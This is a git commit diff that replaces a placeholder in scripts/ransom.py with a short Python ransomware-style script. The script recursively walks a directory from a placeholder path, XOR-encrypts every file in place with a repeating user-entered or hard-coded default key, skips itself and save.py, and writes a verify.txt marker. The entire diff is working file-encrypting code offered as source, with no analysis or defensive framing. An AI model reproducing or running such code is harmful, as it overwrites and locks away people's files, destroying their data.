667a940a56fa425a7ea988a6b30355f4ce1bfe4d
Nekro <70316327+NeKroFR@users.noreply.github.com>
2023-12-12 16:23:30 +0100

    Update ransom.py

--- scripts/ransom.py
+++ scripts/ransom.py
@@ -1,1 +1,28 @@
-print("Coming soon...")
+import os
+
+def cipher(file,key):
+    data=bytearray(open(file,"rb").read())
+    while len(key)<len(data):
+        key+=key
+    for i in range(len(data)):
+        data[i]^=ord(key[i])
+    open(file,"wb").write(data)
+    
+def ransom(way):
+    directory=os.listdir(way)
+    for dir in directory:
+        if dir in exclu:
+            continue
+        if os.path.isdir(f"{way}/{dir}"):
+            ransom(f"{way}/{dir}/")
+        else:
+            cipher(f"{way}/{dir}",key)
+
+exclu=["ransom.py","save.py"]
+path="__PATH__"
+key = input("Enter a key: ")
+if key =="":
+    key="JNUW4ZZAMRUWG2ZAO5QXGIDIMVZGK==="
+open(path+"/verify.txt","w").write("That's the good key!")
+ransom(path)
+print("Done!")
